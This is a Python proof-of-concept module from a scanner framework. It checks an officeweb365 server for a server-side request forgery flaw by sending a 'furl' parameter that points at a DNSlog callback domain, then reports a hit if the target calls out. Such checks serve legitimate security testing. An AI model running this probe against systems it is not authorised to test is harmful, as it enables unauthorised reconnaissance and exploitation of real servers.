'''
Function:
    officeweb365 SSRF导致任意文件上传
Author:
    spmonkey，夜梓月
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import re
import os
import sys
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()
path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(path)
from modules.dnslog import dnslogs


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        self.result_text = ""
        self.proxies = proxies

    def vuln(self):
        dnslog_all = dnslogs().get_dnslog()
        dnslog = dnslog_all[0]
        url = "{}?furl=http://{}/".format(self.url, dnslog)
        try:
            result = requests.get(url=url, headers=self.headers, verify=False, proxies=self.proxies)
            for i in range(5):
                dnslog_result = dnslogs().get_result(dnslog_all[1])
            if dnslog_result != "[]":
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在服务器端请求伪造漏洞\033[0m
                 GET {} HTTP/1.1
                 Host: {}""".format(target.path + "?" + target.query, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                return True
            else:
                return False
        except:
            return False

    def main(self):
        if self.vuln():
            return self.result_text
        else:
            return False


